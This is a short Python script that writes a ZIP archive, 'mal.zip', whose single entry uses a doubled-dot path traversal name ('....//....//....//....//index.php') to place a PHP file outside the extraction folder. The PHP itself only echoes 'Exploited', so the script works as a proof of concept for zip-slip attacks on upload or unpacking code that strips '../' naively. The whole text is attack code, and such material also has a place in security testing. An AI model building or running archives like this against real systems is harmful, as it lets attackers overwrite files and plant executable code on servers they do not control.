import zipfile

# Create a ZIP file with a path traversal pattern
with zipfile.ZipFile('mal.zip', 'w') as zf:
    # Ensure the file path is crafted to exploit path traversal
    zf.writestr('....//....//....//....//index.php', '<?php echo "Exploited"; ?>')
